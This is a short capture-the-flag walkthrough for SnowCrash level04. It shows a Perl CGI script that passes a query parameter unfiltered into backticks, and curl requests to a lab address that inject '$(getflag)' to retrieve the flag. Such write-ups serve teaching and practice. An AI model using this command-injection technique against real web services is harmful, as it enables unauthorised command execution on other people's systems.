## 1. Connect to level04:

```bash
level03@SnowCrash:~$ su level04
password: *use previously found flag*
```

## 2. See existing files:

```bash
level04@SnowCrash:~$ ls -l
    total 4
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

level04@SnowCrash:~$ cat level04.pl
```

The function `x` executes the shell command provided in `$y` using backticks.
This means that a malicious command can be injected through the `x` parameter.

The script does not filter or validate the command being executed. This creates an opportunity for **command injection**.

## 3. Check if server 4747 is running

```bash
curl 192.168.56.102:4747
```
An empty line is returned, which means that it is active.

## 4. Inject your command

### Example
```bash
curl 192.168.56.102:4747?x=ls
```

### It will return `ls` because function `x` prints what we give as a parameter. Therefore, inject command `getflag` to get the flag
```bash
curl '192.168.56.102:4747?x=$(getflag)'
```